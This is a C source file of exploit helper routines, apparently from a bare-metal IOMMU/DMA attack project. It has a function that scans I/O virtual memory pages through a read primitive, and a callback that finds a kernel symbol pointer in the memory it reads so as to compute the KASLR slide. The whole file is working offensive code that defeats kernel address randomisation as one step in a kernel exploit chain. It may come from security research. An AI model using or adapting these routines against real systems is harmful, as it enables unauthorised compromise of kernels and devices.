/** Generally useful IOMMU exploit functions */

#include <stdint.h>
#include <stdio.h>

#include "baremetalsupport.h"

#include "iownmmu/rw.h"

/**
 * Given two virtual IO page addresses and a function to process a page of memory,
 * process the pages in the window between the two addresses. If the process function
 * returns a nonzero value, stop exploring and return it. window_start and window_end
 * must be page aligned for this function to work as expected.
 *
 * Parameters:
 *  window_start: the page-aligned virtual IO address of the start of the search window
 *  window_end: the page-aligned virtual IO address of the end of the search window (this
 *    page will be searched too); if this parameter is zero, the function will search
 *    indefinitely until the process function returns a nonzero result
 *  process: a function that takes in a pointer to a page of memory, the IO virtual address of
 *    that memory, and a third argument of 8 bytes and returns 8 bytes
 *  process_arg: the 8 byte third argument to give to process
 *
 * Returns:
 *  the data returned by process if process ever returns a nonzero value, 0 if the specified
 *  window is invalid or process never returns a nonzero result
 */
uint64_t iovirtual_window_explorer(uint64_t window_start, uint64_t window_end,
    uint64_t (*process)(void *, uint64_t, uint64_t), uint64_t process_arg) {
  // specified window had negative size
  if ((window_end != 0) && (window_end < window_start)) {
    return 0;
  }

  // if window_end is 0, loop until something is found; otherwise
  // check the specified window only
  uint64_t iter = window_start;
  uint8_t page[0x1000];
  while ((window_end == 0) || (iter <= window_end)) {
    printf("Trying 0x");
    write_uint_64_hex(iter, '0');
    printf("...\n");
    int32_t status = read_buffer(iter, 4096, page);
    if (status != 0) {
      printf("Bad read...\n");
      iter += 0x1000;
      continue;
    }

    uint64_t result = process(page, iter, process_arg);
    if (result != 0) {
      return result;
    }

    iter += 0x1000;
  }

  // we couldn't find anything interesting in the window
  return 0;
}


/**
 * Process heuristic for use with iovirtual_window_explorer that uses the known
 * static kernel virtual address of a kernel symbol (this can be found with nm) to look
 * for a KASLR shifted address of that symbol on a page. If a shifted address is found,
 * the KASLR slide is calculated and returned. This function assumes that pointers in
 * memory will be 8 byte aligned.
 *
 * Parameters:
 *  mem: pointer to a page of memory
 *  symbol_static_address: the static address of a kernel symbol
 *
 * Returns:
 *  the KASLR slide if the shifted address is found, 0 otherwise
 */
uint64_t kaslr_slide_symbol_process(void *mem, uint64_t unused, uint64_t symbol_static_address) {
  uint64_t *page = (uint64_t *)mem;

  // if we find the desired pointer on this page, return the slide
  for (int32_t i = 0; i < 512; i++) {
    // first 7 hex digits (0xffffff8) and last 5 should be unmodified by KASLR
    if (((page[i] & 0xfffff) == (symbol_static_address & 0xfffff)) &&
        ((page[i] & 0xfffffff000000000) == (symbol_static_address & 0xfffffff000000000))) {
      uint64_t slide = page[i] - symbol_static_address;
      printf("Slide: 0x");
      write_uint_64_hex(slide, '0');
      printf("...\n");
      return slide;
    }
  }

  return 0;
}
